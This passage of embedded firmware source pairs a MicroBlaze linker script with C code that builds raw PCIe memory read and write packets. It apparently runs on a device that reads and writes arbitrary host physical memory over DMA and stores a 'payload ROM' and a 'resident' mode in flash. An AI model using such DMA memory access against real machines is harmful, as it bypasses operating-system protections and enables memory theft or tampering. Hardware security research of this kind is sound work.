   KEEP (*(EXCLUDE_FILE(*crtend.o) .ctors))
   KEEP (*(SORT(.ctors.*)))
   KEEP (*(.ctors))
   __CTOR_END__ = .;
   ___CTORS_END___ = .;
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.dtors : {
   __DTOR_LIST__ = .;
   ___DTORS_LIST___ = .;
   KEEP (*crtbegin.o(.dtors))
   KEEP (*(EXCLUDE_FILE(*crtend.o) .dtors))
   KEEP (*(SORT(.dtors.*)))
   KEEP (*(.dtors))
   PROVIDE(__DTOR_END__ = .);
   PROVIDE(___DTORS_END___ = .);
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.rodata : {
   __rodata_start = .;
   *(.rodata)
   *(.rodata.*)
   *(.gnu.linkonce.r.*)
   __rodata_end = .;
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.sdata2 : {
   . = ALIGN(8);
   __sdata2_start = .;
   *(.sdata2)
   *(.sdata2.*)
   *(.gnu.linkonce.s2.*)
   . = ALIGN(8);
   __sdata2_end = .;
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.sbss2 : {
   __sbss2_start = .;
   *(.sbss2)
   *(.sbss2.*)
   *(.gnu.linkonce.sb2.*)
   __sbss2_end = .;
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.data : {
   . = ALIGN(4);
   __data_start = .;
   *(.data)
   *(.data.*)
   *(.gnu.linkonce.d.*)
   __data_end = .;
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.got : {
   *(.got)
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.got1 : {
   *(.got1)
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.got2 : {
   *(.got2)
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.eh_frame : {
   *(.eh_frame)
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.jcr : {
   *(.jcr)
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.gcc_except_table : {
   *(.gcc_except_table)
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.sdata : {
   . = ALIGN(8);
   __sdata_start = .;
   *(.sdata)
   *(.sdata.*)
   *(.gnu.linkonce.s.*)
   __sdata_end = .;
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.sbss (NOLOAD) : {
   . = ALIGN(4);
   __sbss_start = .;
   *(.sbss)
   *(.sbss.*)
   *(.gnu.linkonce.sb.*)
   . = ALIGN(8);
   __sbss_end = .;
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.tdata : {
   __tdata_start = .;
   *(.tdata)
   *(.tdata.*)
   *(.gnu.linkonce.td.*)
   __tdata_end = .;
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.tbss : {
   __tbss_start = .;
   *(.tbss)
   *(.tbss.*)
   *(.gnu.linkonce.tb.*)
   __tbss_end = .;
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.bss (NOLOAD) : {
   . = ALIGN(4);
   __bss_start = .;
   *(.bss)
   *(.bss.*)
   *(.gnu.linkonce.b.*)
   *(COMMON)
   . = ALIGN(4);
   __bss_end = .;
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

_SDA_BASE_ = __sdata_start + ((__sbss_end - __sdata_start) / 2 );

_SDA2_BASE_ = __sdata2_start + ((__sbss2_end - __sdata2_start) / 2 );

/* Generate Stack and Heap definitions */

.heap (NOLOAD) : {
   . = ALIGN(8);
   _heap = .;
   _heap_start = .;
   . += _HEAP_SIZE;
   _heap_end = .;
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.stack (NOLOAD) : {
   _stack_end = .;
   . += _STACK_SIZE;
   . = ALIGN(8);
   _stack = .;
   __stack = _stack;
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

_end = .;
}


```

`software/application/src/pcie_tlp.c`:

```c
#include <stdio.h>
#include <stdbool.h>
#include <string.h>

#include <xil_printf.h>
#include <xil_types.h>
#include <xstatus.h>

#include "platform_config.h"
#include "axi_dma.h"
#include "protocol.h"
#include "pcie_tlp.h"
#include "common.h"

// DMA buffers for transmit and receive
static u8 *m_buff_rx = (u8 *)(DMA_BUFF_ADDR + 0);
static u8 *m_buff_tx = (u8 *)(DMA_BUFF_ADDR + PROT_MAX_PACKET_SIZE);

// defined in application.c
extern u32 m_dev_id;

int tlp_size(u8 *data)
{
    u32 header = 0, type = 0, size = 0;

    memcpy(&header, data, sizeof(u32));

    type = (header >> 29) & 0x3;
    size = (header >> 0) & 0x3ff;

    switch (type)
    {
    case TLP_3_NO_DATA:

        return sizeof(u32) * 3;

    case TLP_4_NO_DATA:
 
        return sizeof(u32) * 4;

    case TLP_3_DATA:

        return sizeof(u32) * (3 + size);

    case TLP_4_DATA:

        return sizeof(u32) * (4 + size);
    }

    return 0;
}

int tlp_recv(u8 *buff, u32 *ret_size)
{
    u32 size = 0;

    // receive TLP
    if (axi_dma_queue_rx(m_buff_rx, PROT_MAX_PACKET_SIZE, NULL) == XST_SUCCESS)
    {
        // wait for the completion
        if (axi_dma_wait_rx(TLP_READ_TIMEOUT) == XST_SUCCESS)
        {

#if (XPAR_MICROBLAZE_USE_DCACHE != 0)

            // invalidate cache after the transfer
            Xil_DCacheInvalidateRange((u32)m_buff_rx, PROT_MAX_PACKET_SIZE);
#endif
            // calculate TLP length
            if ((size = tlp_size(m_buff_rx)) != 0)
            {
                if (buff)
                {
                    // copy TLP data to the DMA transmit buffer
                    memcpy(buff, m_buff_rx, size);
                }

                if (ret_size)
                {
                    *ret_size = size;
                }

                return XST_SUCCESS;
            }
        }
        else
        {
            return XST_TIMEOUT;
        }
    }

    return XST_FAILURE;
}

int tlp_send(u8 *buff, u32 size)
{
    if (buff)
    {
        // copy TLP data to the DMA transmit buffer
        memcpy(m_buff_tx, buff, size);
    }

#if (XPAR_MICROBLAZE_USE_DCACHE != 0)

    // flush cache before the transfer
    Xil_DCacheFlushRange((u32)m_buff_tx, PROT_MAX_PACKET_SIZE);

#endif

    // send TLP
    if (axi_dma_queue_tx(m_buff_tx, size, NULL) == XST_SUCCESS)
    {
        // wait for the completion
        axi_dma_wait_tx(0);

        return XST_SUCCESS;
    }

    return XST_FAILURE;
}

int mem_read(u64 addr, u8 *buff, u32 size)
{
    u32 ptr = 0, tlp_size = 0;
    u32 *tlp_tx = (u32 *)m_buff_tx, *tlp_rx = (u32 *)m_buff_rx;    

    if (addr % sizeof(u32) != 0)
    {
        xil_printf("mem_read() ERROR: address is not aligned\n");
        return XST_FAILURE;
    }
    
    while (ptr < size)
    {        
        // construct memory read TLP
        tlp_tx[0] = (TLP_TYPE_MRd64 << 24) | 1; // TLP type and data size
        tlp_tx[1] = (m_dev_id << 16) | 0xff;    // requester ID and byte enable flags
        tlp_tx[2] = (u32)(addr >> 32);          // high dword of physical memory address
        tlp_tx[3] = (u32)(addr & 0xffffffff);   // low dword of physical memory address

        // send request
        if (tlp_send(NULL, sizeof(u32) * 4) != XST_SUCCESS)
        {
            return XST_FAILURE;
        }

        // receive reply
        if (tlp_recv(NULL, &tlp_size) != XST_SUCCESS)
        {
            return XST_FAILURE;
        }

        // check for the valid completion TLP
        if (tlp_size != 4 && (tlp_rx[0] >> 24) != TLP_TYPE_CplD)
        {
            return XST_FAILURE;
        }

        // get completion data
        u8 *data = (u8 *)&tlp_rx[3];

        // swap endianess
        u32 val = data[3] | (data[2] << 8) | (data[1] << 16) | (data[0] << 24);

        // copy data to the output buffer
        memcpy(buff + ptr, &val, MIN(sizeof(u32), size - ptr));

        addr += sizeof(u32);
        ptr += sizeof(u32);
    }

    return XST_SUCCESS;
}

int mem_write(u64 addr, u8 *buff, u32 size)
{
    u32 ptr = 0;
    u32 *tlp_tx = (u32 *)m_buff_tx;    

    if (addr % sizeof(u32) != 0)
    {
        xil_printf("mem_read() ERROR: address is not aligned\n");
        return XST_FAILURE;
    }

    if (size % sizeof(u32) != 0)
    {
        xil_printf("mem_read() ERROR: size is not aligned\n");
        return XST_FAILURE;
    }

    while (ptr < size)
    {
        // get data to write
        u8 *data = buff + ptr;

        // swap endianess
        u32 val = data[3] | (data[2] << 8) | (data[1] << 16) | (data[0] << 24);

        // construct memory write TLP
        tlp_tx[0] = (TLP_TYPE_MWr64 << 24) | 1; // TLP type and data size
        tlp_tx[1] = (m_dev_id << 16) | 0xff;    // requester ID and byte enable flags
        tlp_tx[2] = (u32)(addr >> 32);          // high dword of physical memory address
        tlp_tx[3] = (u32)(addr & 0xffffffff);   // low dword of physical memory address
        tlp_tx[4] = val;                        // data

        // send request
        if (tlp_send(NULL, sizeof(u32) * 5) != XST_SUCCESS)
        {
            return XST_FAILURE;
        }

        addr += sizeof(u32);
        ptr += sizeof(u32);
    }

    return XST_SUCCESS;
}

```

`software/application/src/pcie_tlp.h`:

```h
#ifndef __PCIE_TLP_H_
#define __PCIE_TLP_H_

#define TLP_3_NO_DATA    0
#define TLP_4_NO_DATA    1
#define TLP_3_DATA       2
#define TLP_4_DATA       3

#define TLP_TYPE_MRd32   0x00
#define TLP_TYPE_MRd64   0x20
#define TLP_TYPE_MRdLk32 0x01
#define TLP_TYPE_MRdLk64 0x21
#define TLP_TYPE_MWr32   0x40
#define TLP_TYPE_MWr64   0x60
#define TLP_TYPE_IORd    0x02
#define TLP_TYPE_IOWr    0x42
#define TLP_TYPE_CfgRd0  0x04
#define TLP_TYPE_CfgRd1  0x05
#define TLP_TYPE_CfgWr0  0x44
#define TLP_TYPE_CfgWr1  0x45
#define TLP_TYPE_Cpl     0x0A
#define TLP_TYPE_CplD    0x4A
#define TLP_TYPE_CplLk   0x0B
#define TLP_TYPE_CplLkD  0x4B

int tlp_size(u8 *data);

int tlp_recv(u8 *buff, u32 *ret_size);
int tlp_send(u8 *buff, u32 size);

int mem_read(u64 addr, u8 *buff, u32 size);
int mem_write(u64 addr, u8 *buff, u32 size);

#endif

```

`software/application/src/platform.c`:

```c
#include <xparameters.h>
#include <xil_cache.h>

#include "platform_config.h"

void enable_caches(void)
{

#if (XPAR_MICROBLAZE_USE_ICACHE != 0)

    Xil_ICacheEnable();

#endif

#if (XPAR_MICROBLAZE_USE_DCACHE != 0)

    Xil_DCacheEnable();

#endif

}

void disable_caches(void)
{

#if (XPAR_MICROBLAZE_USE_DCACHE != 0)

    Xil_DCacheDisable();

#endif

#if (XPAR_MICROBLAZE_USE_ICACHE != 0)

    Xil_ICacheDisable();

#endif

}

void init_uart(void)
{
    // bootrom/BSP configures PS7/PSU UART to 115200 bps
}

void init_platform(void)
{    
    enable_caches();

    init_uart();
}

void cleanup_platform(void)
{
    disable_caches();
}

```

`software/application/src/platform.h`:

```h
#ifndef __PLATFORM_H_
#define __PLATFORM_H_

#include "platform_config.h"

void init_platform();
void cleanup_platform();

#endif

```

`software/application/src/platform_config.h`:

```h
#ifndef __PLATFORM_CONFIG_H_
#define __PLATFORM_CONFIG_H_

#define USE_ROM

// device identifiers
#define DEVICE_ID_UART XPAR_AXI_UARTLITE_0_DEVICE_ID
#define DEVICE_ID_GPIO XPAR_AXI_GPIO_0_DEVICE_ID
#define DEVICE_ID_INTC XPAR_MICROBLAZE_0_AXI_INTC_DEVICE_ID
#define DEVICE_ID_AXI_DMA XPAR_AXI_DMA_0_DEVICE_ID
#define DEVICE_ID_SPI XPAR_AXI_QUAD_SPI_0_DEVICE_ID

// interrupt vectors
#define VEC_ID_AXI_DMA_MM2S XPAR_INTC_0_AXIDMA_0_MM2S_INTROUT_VEC_ID
#define VEC_ID_AXI_DMA_S2MM XPAR_INTC_0_AXIDMA_0_S2MM_INTROUT_VEC_ID
#define VEC_ID_SPI XPAR_INTC_0_SPI_0_VEC_ID

// DMA buffer base address
#define DMA_BUFF_ADDR XPAR_AXI_BRAM_CTRL_0_S_AXI_BASEADDR

// TLP receive timeout
#define TLP_READ_TIMEOUT 1000000

// address and size of the payload ROM on the SPI flash
#define ROM_SPI_ADDR 0x150000
#define ROM_SPI_SIZE 0x2b0000

// address and size of the FPGA bitstream on the SPI flash
#define BIT_SPI_ADDR 0
#define BIT_SPI_SIZE 0x150000

#endif

```

`software/application/src/protocol.h`:

```h
#ifndef __PROTOCOL_H_
#define __PROTOCOL_H_

#define PROT_CTL_PING             0
#define PROT_CTL_RESET            1
#define PROT_CTL_STATUS           2
#define PROT_CTL_TLP_SEND         3
#define PROT_CTL_TLP_RECV         4
#define PROT_CTL_SUCCESS          5
#define PROT_CTL_ERROR_FAILED     6
#define PROT_CTL_ERROR_TIMEOUT    7
#define PROT_CTL_CONFIG           8
#define PROT_CTL_TEST             9
#define PROT_CTL_RESIDENT_ON      10
#define PROT_CTL_RESIDENT_OFF     11
#define PROT_CTL_ROM_WRITE        12
#define PROT_CTL_ROM_ERASE        13
#define PROT_CTL_ROM_LOG_ON       14
#define PROT_CTL_ROM_LOG_OFF      15
#define PROT_CTL_ROM_SIZE         16

/* used only by this particular design */
#define PROT_CTL_BIT_WRITE        0xfe
#define PROT_CTL_BIT_ERASE        0xff

typedef struct _PROT_CTL
{
    u8 code; // see PROT_CTL_*
    u8 size;
    u8 data[];

} __attribute__((packed)) PROT_CTL;

typedef struct _PROT_CTL_ROM
{
    u32 offset;
    u8 data[];

} __attribute__((packed)) PROT_CTL_ROM;

#define PROT_MAX_PACKET_SIZE 0x100

#endif

```